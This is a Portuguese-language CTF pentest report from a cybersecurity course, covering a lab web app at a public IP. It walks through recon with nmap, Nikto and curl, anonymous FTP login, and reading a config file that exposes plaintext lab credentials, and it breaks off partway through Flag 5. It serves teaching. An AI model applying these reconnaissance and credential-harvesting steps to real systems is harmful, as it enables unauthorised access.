# Relatório de Pentest - Desafio Final CTF

---

## 🛠️ <a name="introducao"></a>Introdução

| Este relatório apresenta os resultados do Desafio Final CTF (Capture The Flag) da **[Formação em Cybersecurity VaiNaWeb - Módulo 3: Ethical Hacking](https://github.com/Kensei-CyberSec-Lab/formacao-cybersec/tree/main/modulo3-ethical-hacking)**. O objetivo do desafio foi realizar um teste de penetração completo na aplicação web TechCorp Solutions, identificando e explorando vulnerabilidades de segurança em um ambiente controlado de laboratório. Durante o assessment, foram capturadas 17 flags representando diferentes categorias de vulnerabilidades, incluindo falhas de controle de acesso, exposição de credenciais, injeção SQL, cross-site scripting (XSS) e configurações inseguras. Cada flag documentada demonstra uma vulnerabilidade real explorada com sucesso, evidenciando riscos críticos que comprometem a segurança da aplicação e dos dados corporativos.  |
|:---:|
| |
| **<a href="/doc/Desafio_Final_CTF–Formacao_em_Ciberseguranca-v.1.0.pdf" target="_blank"><span style="color: blue;">Clique no book para baixar a versão detalhada!</span>** |
| <a href="/doc/Desafio_Final_CTF–Formacao_em_Ciberseguranca-v.1.0.pdf" target="_blank"><img style="margin: 10px" height="700" width="800" src="/doc/img/ebook_animacao_600_390.gif" alt="Ebook"/></a> |
|  <a href="https://kensei.seg.br/lab" target="_blank"><img style="margin: 10px" height="100" width="500" src="https://raw.githubusercontent.com/ClaudioMendonca-Eng/VaiNaWeb-FormacaoEmCybersecurity-Modulo02/main/doc/img/logos.png" alt="Logos Kensei e Vai na Web"/></a> |

> [!NOTE]
> **CURSO FORMAÇÃO CIBERSEC**
> 
> ***Autor:*** Claudio Mendonça - ***Data:*** 01/12/2025 - ***Versão:*** 1.0
>
> **Mestre:** [Jose Menezes](https://github.com/jcarlos78) - **Instrutores:** [Gilson Andrade](https://github.com/GilsonJunio) / [João Pedro Belo](https://github.com/silvajpedro)


---
🎙️ <strong>Apresentação em Áudio do Laboratório WAF</strong>



https://github.com/user-attachments/assets/9f1964e7-d997-4cbd-b3f4-7c635bf52292


---

## 🏆 Ranking CTF - 1º Lugar

Durante o **Desafio Final CTF da Formação em Cybersecurity VaiNaWeb**, foi implementado um **sistema de ranking competitivo** onde os participantes pontuavam pela captura de flags em tempo real. O sistema KENSEI CyberSec Lab rastreava automaticamente cada flag encontrada, atribuindo pontos e atualizando o ranking instantaneamente, criando um ambiente de competição saudável que simulava cenários reais de CTF profissionais.

**Resultado Final:**

<div align="center">
  <img src="/doc/img/ranking.png" alt="Ranking CTF - Sistema KENSEI" width="750"/>
</div>

### 🥇 Conquista: 1º Lugar no Ranking

**Cláudio Mendonça** conquistou o **1º lugar** no ranking final do desafio, capturando todas as **16 flags disponíveis** e alcançando **390 pontos**, o mesmo obtido pelos 7 primeiros colocados que também completaram o desafio. Este resultado demonstra:

**Competências Técnicas Validadas:**
- ✅ Domínio completo de técnicas de reconnaissance (Nmap, Nikto, Gobuster)
- ✅ Exploração eficiente de SQL Injection e XSS
- ✅ Habilidade em privilege escalation (user → root)
- ✅ Análise forense de logs e histórico de comandos
- ✅ Descoberta de credenciais em múltiplos vetores (FTP, Git, arquivos de configuração)

**Estatísticas do Desafio:**
- **Alunos cadastrados:** 44 participantes
- **Flags encontradas (total):** 352 (média de 8 flags por participante)
- **Flags disponíveis:** 16 no sistema de ranking
- **Pontuação máxima:** 390 pontos (alcançada por 7 participantes)
- **Taxa de conclusão completa:** ~16% (7/44 alunos completaram todas as flags)

O sistema de ranking KENSEI demonstrou ser uma excelente ferramenta pedagógica, incentivando os alunos a aplicarem metodologias estruturadas de pentest e documentarem suas descobertas de forma sistemática, preparando-os para desafios reais de CTF e certificações como OSCP, CEH e eJPT.

---

## 📖 Sumário
<a id="topo"></a>

1. [Introdução](#introducao)
2. [Sumário Executivo](#sumario-executivo)
3. [Objetivo e Escopo](#objetivo-e-escopo)
4. [Metodologia](#metodologia)
5. [Flags Capturadas](#flags-capturadas)
   - [Flag 1: HTML Source Code Inspection](#flag-1-html-source-code-inspection)
   - [Flag 2: Robots.txt Discovery](#flag-2-robotstxt-discovery)
   - [Flag 3 e 4: FTP Anonymous Access e Config File Read](#flag-3-e-4-ftp-anonymous-access-e-config-file-read)
   - [Flag 5: Password File Discovery](#flag-5-password-file-discovery)
   - [Flag 6: Database Credentials Exposed](#flag-6-database-credentials-exposed)
   - [Flag 7: Database View Discovery](#flag-7-database-view-discovery)
   - [Flag 8: Admin Dashboard Access](#flag-8-admin-dashboard-access)
   - [Flag 9: SQL Injection](#flag-9-sql-injection)
   - [Flag 10: Stored XSS](#flag-10-stored-xss)
   - [Flag 11: Git Repository Exposure](#flag-11-git-repository-exposure)
   - [Flag 12: Backup File Access](#flag-12-backup-file-access)
   - [Flag 13: SSH Access](#flag-13-ssh-access)
   - [Flag 14: Bash History Discovery](#flag-14-bash-history-discovery)
   - [Flag 15: Environment Variables](#flag-15-environment-variables)
   - [Flag 16: Privilege Escalation](#flag-16-privilege-escalation)
   - [Flag 17: Root Access](#flag-17-root-access)
6. [Arquitetura do Ambiente Alvo](#arquitetura-do-ambiente-alvo)
7. [Análise SWOT](#analise-swot)
8. [Conclusão Geral](#conclusao-geral)
9. [Referências Bibliográficas](#referencias-bibliograficas)

---

## 📋 <a name="sumario-executivo"></a>Sumário Executivo

Este relatório documenta os resultados do teste de penetração realizado na aplicação web TechCorp Solutions (http://98.95.207.28) como parte do Desafio Final CTF da Formação em Cibersegurança VaiNaWeb. Durante o assessment, foram identificadas 17 vulnerabilidades críticas e de alta severidade que comprometem significativamente a postura de segurança da organização. As descobertas incluem credenciais hardcoded em múltiplos arquivos, falhas de controle de acesso permitindo acesso não autorizado a recursos sensíveis, SQL Injection que viabiliza exfiltração completa do banco de dados, Cross-Site Scripting (XSS) facilitando ataques de roubo de sessão, e vazamento massivo de informações através de arquivos expostos publicamente.

A infraestrutura apresenta stack LAMP (Linux Ubuntu 20.04.6 LTS, Apache 2.4.54/2.4.65, MySQL 8.0.44, PHP 7.4.33) com múltiplas vulnerabilidades de configuração que, combinadas, permitem comprometimento total do ambiente. Este relatório detalha cada vulnerabilidade explorada com evidências técnicas, análise de impacto baseada em CVSS v3.1, mapeamento para frameworks de segurança (OWASP Top 10 2021, CWE, PCI DSS, ISO 27001), e recomendações priorizadas de remediação.

**Principais resultados do assessment:**
- ✅ 17 flags capturadas representando diferentes vetores de ataque
- ✅ Comprometimento completo do sistema (acesso root obtido)
- ✅ Exposição de credenciais em 5 arquivos diferentes
- ✅ SQL Injection com dump completo do banco de dados
- ✅ Acesso não autorizado a painéis administrativos
- ✅ Escalonamento de privilégios de usuário comum para root



<div align="center">
  <img src="/doc/img/infor3.png" alt="17 flags capturadas representando diferentes vetores de ataque" width="750"/>
</div>

A análise SWOT complementar fornece visão estratégica identificando 6 forças organizacionais, 10 fraquezas críticas, 8 oportunidades de melhoria e 10 ameaças externas, culminando em roadmap de implementação estruturado em três fases (0-30, 30-90, 90-180 dias) para transformação da postura de segurança de reativa para proativa.

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

## 🎯 <a name="objetivo-e-escopo"></a>Objetivo e Escopo

**Objetivo:** Avaliar a segurança da aplicação web TechCorp Solutions através de metodologia estruturada de Capture The Flag (CTF), identificando vulnerabilidades exploráveis, capturando flags como prova de conceito, e documentando riscos para subsidiar decisões de remediação.

O objetivo principal deste pentest foi realizar uma análise abrangente de segurança cobrindo múltiplas camadas da infraestrutura: aplicação web (frontend/backend), banco de dados MySQL, serviços de rede (HTTP:80, FTP:21, SSH:2222, MySQL:3306, HTTP-alt:8080), sistema operacional Linux, e configurações gerais de infraestrutura. Os testes executados abrangeram as principais categorias do OWASP Top 10 2021, utilizando combinação de técnicas manuais e automatizadas para identificação e exploração de vulnerabilidades.

**Escopo do assessment:**

- **Alvo:** Aplicação web TechCorp Solutions (http://98.95.207.28)
- **Período:** 21 de novembro a 30 de novembro de 2025
- **Ambiente:** Laboratório CTF controlado (grey-box testing)
- **Serviços testados:** HTTP (80, 8080), FTP (21), SSH (2222), MySQL (3306)
- **Tecnologias:** Stack LAMP (Linux Ubuntu 20.04.6, Apache 2.4.54/2.4.65, MySQL 8.0.44, PHP 7.4.33)
- **Categorias OWASP:** Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Authentication Failures, entre outras

**Limitações e exclusões:**
- ❌ Testes de negação de serviço (DoS/DDoS)
- ❌ Engenharia social contra funcionários reais
- ❌ Acesso físico às instalações
- ❌ Impacto em ambientes de produção ou dados reais

Os 17 objetivos (flags) capturados representam diferentes vetores de ataque e vulnerabilidades comuns em aplicações web modernas, proporcionando avaliação holística da superfície de ataque.

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

## 🔬 <a name="metodologia"></a>Metodologia

A metodologia adotada seguiu abordagem sistemática baseada no framework **PTES (Penetration Testing Execution Standard)** adaptado para contexto CTF, estruturada em cinco fases sequenciais:

### **Fase 1: Reconhecimento e Enumeração**
- **Ferramentas:** Nmap (port scanning), Nikto (web vulnerability scanning), curl/wget (análise HTTP)
- **Técnicas:** Inspeção de código-fonte HTML, análise de arquivos públicos (robots.txt, .git, .env)
- **Objetivo:** Mapear superfície de ataque e identificar pontos de entrada

### **Fase 2: Análise de Vulnerabilidades**
- **Foco:** Falhas de configuração, credenciais expostas, injeções SQL/XSS, broken access control
- **Métodos:** Análise manual de código PHP, testes de input validation, fuzzing de parâmetros
- **Objetivo:** Identificar vulnerabilidades exploráveis

### **Fase 3: Exploração**
- **Atividades:** Execução de provas de conceito, captura de flags, escalonamento de privilégios
- **Exemplo:** Escalonamento user techcorp → root via sudo
- **Objetivo:** Validar vulnerabilidades e demonstrar impacto real

### **Fase 4: Pós-Exploração**
- **Análise:** Enumeração de sistema comprometido, arquivos sensíveis (.bash_history, backups, git)
- **Objetivo:** Mapear vetores de persistência e impacto estendido

### **Fase 5: Documentação e Análise**
- **Evidências:** Screenshots, outputs de comandos, código explorado
- **Análise:** Scores CVSS v3.1, mapeamento OWASP/CWE, compliance (PCI DSS, ISO 27001, NIST, LGPD)
- **Entrega:** Recomendações priorizadas de remediação com análise SWOT estratégica

Todas as atividades foram realizadas em ambiente controlado de laboratório CTF, garantindo testes éticos e sem impacto em sistemas de produção.

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

## 🚩 <a name="flags-capturadas"></a>Flags Capturadas

### <a name="flag-1-html-source-code-inspection"></a>Flag 1: HTML Source Code Inspection

#### Conceito: Inspeção do Código Fonte HTML

A inspeção do código fonte HTML é uma técnica fundamental em testes de segurança e pentest que consiste em examinar o código HTML de uma página web para identificar informações sensíveis, comentários de desenvolvedores, credenciais expostas, endpoints ocultos ou outras vulnerabilidades. Muitas vezes, desenvolvedores deixam comentários no código fonte durante o processo de desenvolvimento contendo informações que não deveriam estar disponíveis publicamente, como flags de CTF, notas sobre funcionalidades, ou até mesmo senhas e tokens de API. Esta técnica é considerada uma das mais básicas em reconhecimento passivo, pois não requer interação agressiva com o servidor - apenas a visualização do código que é enviado naturalmente ao navegador. Ferramentas de desenvolvedor integradas nos navegadores modernos (como Chrome DevTools, Firefox Developer Tools) ou ferramentas de linha de comando (como curl, wget) permitem essa inspeção de forma simples e eficaz.

#### Exploração Realizada

Para capturar a flag oculta no código fonte HTML do ambiente alvo (http://98.95.207.28/), foram utilizadas duas abordagens complementares. Inicialmente, foi realizada uma inspeção manual através do navegador web, acessando a página e utilizando a funcionalidade "Inspecionar elemento" (clique direito > Inspecionar ou F12), navegando pela estrutura HTML até identificar um comentário suspeito. Em seguida, para automatizar e confirmar a descoberta, foi utilizado o terminal Linux com o comando `curl "http://98.95.207.28/" | grep FLAG`. Neste comando, o `curl` é uma ferramenta de linha de comando que realiza requisições HTTP e retorna o conteúdo completo da página (todo o código HTML), enquanto o pipe `|` redireciona essa saída para o comando `grep FLAG`, que filtra e exibe apenas as linhas que contêm a palavra "FLAG". Esta combinação de comandos é extremamente eficiente em ambientes de pentest, pois permite identificar rapidamente flags ou padrões específicos sem a necessidade de análise visual manual de todo o código fonte.

**Flag Capturada:** `FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n}`

**Data da Captura:** 30 de novembro de 2025

**Evidências:**

<div align="center">
  <img src="/doc/img/Figura 1 - Website da empresa TechCorp Solutions.png" alt="Screenshot do código fonte HTML com a flag" width="750"/>
</div>

<div align="center">
  <img src="/doc/img/Figura 2 - Página e utilizando a funcionalidade Inspecionar elemento.png" alt="Screenshot da página utilizando a funcionalidade Inspecionar elemento" width="750"/>
</div>

- Screenshot do código fonte HTML mostrando o comentário com a flag
- Output do comando curl com grep destacando a flag encontrada

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

---

### <a name="flag-2-robotstxt-discovery"></a>Flag 2: Robots.txt Discovery

#### Conceito: Descoberta de Informações no Robots.txt

O arquivo `robots.txt` é um arquivo de texto padrão utilizado por websites para comunicar instruções aos web crawlers e bots de mecanismos de busca sobre quais páginas ou diretórios podem ou não ser indexados. Embora sua finalidade original seja legítima, em testes de segurança e pentest, o `robots.txt` frequentemente se torna uma fonte valiosa de informações sensíveis, pois desenvolvedores inadvertidamente revelam a estrutura de diretórios que desejam manter ocultos ou privados. Ao especificar caminhos como "Disallow: /admin/", "Disallow: /backup/", ou "Disallow: /config/", o arquivo essencialmente cria um mapa de áreas potencialmente interessantes para um pentester. Esta descoberta é parte fundamental da fase de reconhecimento (reconnaissance) em um pentest, classificada como coleta passiva de informações, onde não há exploração ativa de vulnerabilidades, apenas a análise de informações publicamente disponíveis que podem indicar vetores de ataque ou áreas sensíveis do sistema.

#### Passo 1: Scan com Nikto

O primeiro passo da exploração foi realizar um scan automatizado utilizando a ferramenta Nikto, através do comando `nikto -h http://98.95.207.28`. O Nikto é um scanner de vulnerabilidades web open-source que realiza testes abrangentes contra servidores web, identificando milhares de arquivos e programas potencialmente perigosos, verificando versões desatualizadas de software, e procurando problemas de configuração específicos de servidores. Neste caso, o parâmetro `-h` especifica o host/URL alvo a ser escaneado. Durante o scan, o Nikto identificou informações cruciais sobre o ambiente: o servidor web Apache/2.4.54 (Debian), a versão do PHP (7.4.33), a presença de directory indexing no diretório `/config/`, e principalmente, a existência do arquivo `/robots.txt` contendo 4 entradas que deveriam ser visualizadas manualmente. O scan também revelou outras vulnerabilidades como a ausência de headers de segurança (X-Frame-Options, X-Content-Type-Options) e a página de login administrativa em `/login.php`. O processo completo levou 1150 segundos e realizou 8106 requisições, demonstrando a abrangência da ferramenta.

**Evidências do Passo 1:**
- Screenshot completo do output do Nikto mostrando todas as descobertas
- Destaque para a linha indicando a presença do robots.txt

#### Passo 2: Análise Manual do Robots.txt

Após a descoberta do arquivo `robots.txt` pelo Nikto, o próximo passo foi examinar manualmente seu conteúdo usando o comando `curl "http://98.95.207.28/robots.txt"`. Esta análise revelou informações extremamente valiosas: quatro diretórios explicitamente bloqueados para crawlers (`/admin/`, `/backup/`, `/.git/`, `/config/`), a flag do desafio oculta em um comentário, e uma dica adicional sobre a existência de um arquivo de backup de banco de dados localizado em `/backup/database_backup_2024.sql`. Cada um desses diretórios representa um potencial vetor de ataque: o diretório `/admin/` pode conter painéis administrativos, `/backup/` claramente armazena backups sensíveis, `/.git/` pode expor o repositório de controle de versão com código-fonte e histórico de commits, e `/config/` pode conter arquivos de configuração com credenciais. A presença da flag em comentário demonstra como informações críticas podem ser inadvertidamente expostas em arquivos aparentemente inofensivos.

**Evidências do Passo 2:**
- Screenshot do comando curl exibindo o conteúdo completo do robots.txt
- Destaque para os diretórios bloqueados e a flag em comentário
- Nota sobre o arquivo de backup revelado

#### Passo 3: Extração Automatizada da Flag

Para confirmar e documentar a captura da flag de forma mais eficiente, foi executado o comando `curl "http://98.95.207.28/robots.txt" | grep FLAG`, combinando a requisição HTTP com filtragem automática. Esta abordagem demonstra uma técnica profissional em pentest onde comandos são encadeados para extração precisa de informações relevantes. O comando retornou estatísticas de transferência (169 bytes recebidos em 631 ms) e isolou a linha contendo a flag, facilitando a documentação e evitando informações desnecessárias. Esta técnica de filtragem é especialmente útil quando se trabalha com múltiplos alvos ou arquivos grandes, permitindo rápida identificação de padrões específicos.

**Evidências do Passo 3:**

<div align="center">
  <img src="/doc/img/Figura 4 - Utilizando a ferramenta Nikto.png" alt="Screenshot do comando curl com grep mostrando apenas a flag extraída" width="750"/>
</div>


<div align="center">
  <img src="/doc/img/Figura 5 - Screenshot do comando curl exibindo o conteúdo completo do robots.txt .png" alt="Screenshot do comando curl exibindo o conteúdo completo do robots.txt" width="750"/>
</div>

- Screenshot do comando curl com grep mostrando apenas a flag extraída
- Métricas de tempo e tamanho da resposta HTTP

**Flag Capturada:** `FLAG{r0b0ts_txt_l34k4g3}`

**Data da Captura:** 27 de novembro de 2025

**Informações Adicionais Descobertas:**
- Diretórios sensíveis identificados: `/admin/`, `/backup/`, `/.git/`, `/config/`
- Arquivo de backup exposto: `/backup/database_backup_2024.sql`
- Servidor: Apache/2.4.54 (Debian)
- Tecnologia: PHP/7.4.33
- Página administrativa: `/login.php`

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---


### Flag 3 e 4: FTP Anonymous Access e Config File Read

#### Conceito: Acesso Anônimo ao Servidor FTP

O FTP (File Transfer Protocol) é um protocolo de rede utilizado para transferência de arquivos entre sistemas através de uma rede TCP/IP. O acesso anônimo ao FTP é uma configuração que permite que usuários se conectem ao servidor sem necessidade de credenciais específicas, utilizando simplesmente o nome de usuário "anonymous" e qualquer senha (tradicionalmente um endereço de e-mail). Embora esta configuração possa ser útil para disponibilizar arquivos públicos, representa uma vulnerabilidade crítica de segurança quando mal configurada, pois pode expor arquivos sensíveis, credenciais, código-fonte, configurações do sistema e documentação interna. Em testes de penetração, a descoberta de um servidor FTP com acesso anônimo habilitado é considerada uma falha de segurança grave, especialmente quando permite não apenas leitura, mas também listagem de diretórios e acesso a arquivos de configuração. Esta vulnerabilidade se enquadra na categoria OWASP A01:2021 - Broken Access Control, onde controles de acesso inadequados permitem que atacantes acessem recursos não autorizados.

#### Conceito: Leitura de Arquivo de Configuração FTP (Config File Read)

A leitura de arquivos de configuração em servidores FTP representa uma vulnerabilidade crítica que ocorre quando arquivos sensíveis contendo configurações, credenciais ou informações do sistema ficam acessíveis através do protocolo FTP, seja por acesso anônimo ou permissões mal configuradas. Arquivos como `users.conf`, `vsftpd.conf`, `.ftpaccess`, ou qualquer arquivo contendo configurações do servidor podem revelar informações extremamente valiosas para um atacante, incluindo: lista de usuários válidos, senhas em texto claro ou hashes, estrutura de diretórios internos, políticas de segurança implementadas, e versões de software em uso. Esta vulnerabilidade é particularmente grave porque transforma uma falha de controle de acesso em uma exposição completa de credenciais e segredos do sistema. Em um contexto de pentest, a descoberta e leitura de arquivos de configuração não apenas fornece flags de CTF, mas também abre portas para escalonamento de privilégios, movimentação lateral na rede, e comprometimento total do sistema. Esta falha combina elementos de OWASP A01:2021 (Broken Access Control) com A04:2021 (Insecure Design), demonstrando falhas tanto na implementação quanto no design da arquitetura de segurança.

#### Passo 1: Mapeamento de Portas e Serviços com Nmap

O primeiro passo da exploração consistiu em realizar um scan de portas e identificação de serviços utilizando o comando `nmap -sV 98.95.207.28`. O parâmetro `-sV` instrui o Nmap a realizar detecção de versões dos serviços em execução, fornecendo informações detalhadas sobre cada serviço identificado. O scan revelou 6 portas com estado significativo: a porta 20/tcp (ftp-data) estava fechada, a porta 21/tcp estava aberta executando vsftpd 3.0.5, a porta 80/tcp com Apache httpd 2.4.54, a porta 2222/tcp com OpenSSH 8.2p1, a porta 3306/tcp com MySQL 8.0.44, e a porta 8080/tcp com Apache httpd 2.4.65. O scan também identificou que 994 portas foram filtradas (no-response), indicando possível presença de firewall. A identificação do vsftpd (Very Secure FTP Daemon) na porta 21 foi crucial, pois este serviço frequentemente é alvo de configurações inseguras de acesso anônimo. O scan completo levou 16.92 segundos e confirmou que o sistema operacional subjacente é Linux com kernel Unix.

**Evidências do Passo 1:**
- Screenshot completo do output do Nmap mostrando todas as portas e serviços descobertos
- Destaque para a porta 21/tcp com o serviço vsftpd 3.0.5

#### Passo 2: Verificação de Acesso Anônimo ao FTP

Após identificar o serviço FTP na porta 21, o próximo passo foi verificar especificamente se o acesso anônimo estava habilitado, utilizando o comando `nmap -p 21 --script ftp-anon 98.95.207.28`. Este comando utiliza o NSE (Nmap Scripting Engine) com o script `ftp-anon`, que testa automaticamente se o servidor FTP permite login anônimo. O parâmetro `-p 21` restringe o scan apenas à porta do FTP, tornando a análise mais rápida e focada. O resultado confirmou a vulnerabilidade crítica: "Anonymous FTP login allowed (FTP code 230)", indicando que o servidor aceita conexões anônimas. O script também tentou obter a listagem de diretórios, mas encontrou um problema de configuração de NAT/firewall onde o IP do modo PASV (172.20.0.20) era diferente do IP público (98.95.207.28), uma informação adicional sobre a arquitetura de rede do alvo. Este scan levou apenas 1.21 segundos e foi decisivo para confirmar a vulnerabilidade antes de tentar a exploração manual.

**Evidências do Passo 2:**
- Screenshot do comando Nmap com script ftp-anon confirmando acesso anônimo permitido
- Mensagem "Anonymous FTP login allowed (FTP code 230)"

#### Passo 3: Conexão e Exploração do Servidor FTP

Com a confirmação de acesso anônimo, foi estabelecida uma conexão direta ao servidor FTP usando o comando `ftp 98.95.207.28`. Ao ser solicitado o nome de usuário, foi utilizado "anonymous", e quando solicitada a senha, foi simplesmente pressionado Enter (senha vazia), resultando na mensagem "230 Login successful". Uma vez conectado, foi executado o comando `ls -la` no prompt do FTP para listar todos os arquivos e diretórios, incluindo ocultos. A listagem revelou uma estrutura preocupante: um arquivo `Dockerfile` (1110 bytes), um diretório `confidential`, um diretório `ftp`, um diretório `public`, um arquivo de configuração `users.conf` (135 bytes), e um arquivo `welcome.txt` (329 bytes). Todos os arquivos tinham permissões de leitura e execução (rwxr-xr-x), indicando má configuração de segurança. A presença de arquivos como `users.conf` e o diretório `confidential` são indicadores claros de exposição de informações sensíveis.

**Evidências do Passo 3:**
- Screenshot da conexão FTP bem-sucedida mostrando "230 Login successful"
- Screenshot da listagem de diretórios (ls -la) mostrando todos os arquivos e pastas

#### Passo 4: Extração de Credenciais do Arquivo users.conf

O arquivo `users.conf` foi identificado como potencialmente sensível devido ao seu nome sugestivo. Utilizando o comando `more users.conf` no prompt FTP, foi possível visualizar seu conteúdo diretamente sem necessidade de download. O arquivo revelou informações extremamente críticas: um comentário contendo uma flag do CTF (`FLAG{c0nf1g_f1l3_r34d}`), e mais grave ainda, quatro conjuntos de credenciais em texto claro: `anonymous:password123`, `ftpadmin:ftp@dm1n123`, `techcorp:TechCorp2024!`, e `guest:guest123`. Esta descoberta representa múltiplas vulnerabilidades: armazenamento de credenciais em texto plano, exposição de credenciais administrativas (ftpadmin), uso de senhas fracas (guest123, password123), e disponibilização de arquivo de configuração crítico através de acesso anônimo. Estas credenciais poderiam ser utilizadas para escalonamento de privilégios, acesso a outros sistemas da rede, ou ataques de credential stuffing.

**Evidências do Passo 4:**
- Screenshot do comando "more users.conf" mostrando a flag e as credenciais expostas
- Destaque para as 4 credenciais descobertas em texto claro

#### Passo 5: Análise do Arquivo welcome.txt e Captura da Flag Principal

O último arquivo analisado foi o `welcome.txt`, acessado através do comando `more welcome.txt`. Este arquivo continha uma mensagem de boas-vindas corporativa identificando o servidor como "TechCorp Solutions - FTP Server", descrevendo-o como usado para "compartilhamento interno de arquivos da empresa" e alertando que era "apenas para uso autorizado". Ironicamente, este aviso de segurança estava em um servidor com acesso anônimo totalmente aberto. Ao final do arquivo, foi descoberta a flag principal desta exploração: `FLAG{ftp_4n0nym0us_4cc3ss}`. A presença deste banner corporativo e o aviso de uso autorizado demonstram que a organização tinha consciência da necessidade de segurança, mas falhou criticamente na implementação ao deixar o acesso anônimo habilitado, criando uma falsa sensação de segurança.

**Evidências do Passo 5:**
- Screenshot do comando "more welcome.txt" mostrando o banner corporativo e a flag
- Destaque para o aviso "Apenas para uso autorizado" contrastando com o acesso anônimo

**Flags Capturadas:** 
- `FLAG{ftp_4n0nym0us_4cc3ss}` (flag principal - acesso anônimo)
- `FLAG{c0nf1g_f1l3_r34d}` (flag bônus - leitura de arquivo de configuração)

**Data da Captura:** 27 de novembro de 2025

**Vulnerabilidades Críticas Identificadas:**
- Acesso FTP anônimo habilitado sem restrições
- Exposição de arquivo de configuração com credenciais em texto claro
- Credenciais administrativas fracas e expostas (ftpadmin:ftp@dm1n123)
- Permissões de leitura irrestritas em arquivos sensíveis
- Diretórios confidenciais acessíveis anonimamente

**Credenciais Comprometidas:**
- anonymous:password123
- ftpadmin:ftp@dm1n123
- techcorp:TechCorp2024!
- guest:guest123

**Informações do Serviço:**
- Servidor: vsftpd 3.0.5
- Porta: 21/tcp
- Sistema Operacional: Unix/Linux
- Modo de transferência: Binary mode

**Recomendações de Remediação:**
1. Desabilitar imediatamente o acesso FTP anônimo
2. Implementar autenticação forte com credenciais únicas
3. Remover arquivo users.conf do diretório FTP ou criptografar credenciais
4. Restringir permissões de leitura em arquivos sensíveis
5. Considerar migração para SFTP (SSH File Transfer Protocol)
6. Implementar auditoria e logging de todas as conexões FTP

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

---

### Flag 5: Password File Discovery

#### Conceito: Descoberta de Arquivo de Senhas via FTP

A descoberta de arquivos de senhas (Password File Discovery) é uma vulnerabilidade crítica que ocorre quando arquivos contendo credenciais, sejam elas de produção, desenvolvimento ou arquivamento, ficam armazenados em locais acessíveis através de protocolos de transferência de arquivos como FTP, especialmente quando combinado com acesso anônimo ou permissões inadequadas. Diferentemente de arquivos de configuração do sistema, estes são documentos explicitamente criados para armazenar múltiplas credenciais de diferentes sistemas, serviços e usuários, funcionando como um "cofre de senhas" não criptografado. Em ambientes corporativos, é comum encontrar arquivos como `passwords.txt`, `credentials.xlsx`, `senhas.doc`, ou `password_archive.txt` que administradores criam para facilitar o gerenciamento de acessos, mas que representam um ponto único de falha catastrófico quando expostos. Esta vulnerabilidade é considerada de severidade CRÍTICA pois compromete não apenas um único sistema, mas potencialmente toda a infraestrutura de TI, incluindo servidores SSH, bancos de dados, redes WiFi, VPNs, e outros serviços críticos. A exposição de arquivo de senhas viola múltiplas categorias do OWASP Top 10: A01:2021 (Broken Access Control), A02:2021 (Cryptographic Failures - por não criptografar dados sensíveis), e A04:2021 (Insecure Design - por manter senhas em texto plano). Em um pentest, a descoberta de tal arquivo representa um "game over" para a segurança do sistema, pois fornece ao atacante um mapa completo de acessos privilegiados.

#### Passo 1: Navegação para o Diretório Confidencial

Após a exploração inicial do servidor FTP e identificação da estrutura de diretórios, o próximo passo foi investigar o diretório `confidential`, que havia sido listado durante a exploração anterior. Utilizando o comando `cd confidential` no prompt FTP, foi realizada a mudança de diretório, confirmada pela mensagem "250 Directory successfully changed". Esta mensagem indica que o servidor FTP aceitou a navegação para um diretório que, pelo nome, deveria conter informações sensíveis e ter acesso restrito. O fato de conseguir acessar um diretório chamado "confidential" através de login anônimo já representa uma falha grave de segurança, demonstrando que a nomenclatura dos diretórios não corresponde às políticas de controle de acesso implementadas. Esta discrepância entre a expectativa de segurança (diretório "confidencial") e a realidade (acessível anonimamente) é um indicador clássico de má configuração de permissões e falta de testes de segurança adequados.

**Evidências do Passo 1:**
- Screenshot do comando `cd confidential` com a confirmação "250 Directory successfully changed"
- Demonstração do acesso bem-sucedido a um diretório marcado como confidencial

#### Passo 2: Listagem do Conteúdo do Diretório Confidential

Uma vez dentro do diretório confidencial, foi executado o comando `ls -la` para obter uma listagem completa de todos os arquivos e suas permissões. A listagem revelou a presença de um único arquivo: `passwords.txt` com 542 bytes, criado em 17 de novembro de 2014 às 14:28. As permissões do arquivo (rwxr-xr-x) indicam que ele possui permissões de leitura para todos os usuários (read for others), uma configuração extremamente perigosa para um arquivo que, pelo nome, claramente contém informações sensíveis. O tamanho do arquivo (542 bytes) sugere um documento de texto contendo múltiplas entradas de credenciais. A nomenclatura explícita do arquivo ("passwords.txt") demonstra falta de práticas básicas de segurança, onde informações sensíveis deveriam, no mínimo, não ter nomes óbvios, além de estarem criptografadas e nunca acessíveis via FTP anônimo.

**Evidências do Passo 2:**
- Screenshot da listagem `ls -la` mostrando o arquivo passwords.txt
- Destaque para as permissões (rwxr-xr-x) e tamanho do arquivo (542 bytes)
- Data de criação do arquivo sensível

#### Passo 3: Extração e Análise do Arquivo de Senhas

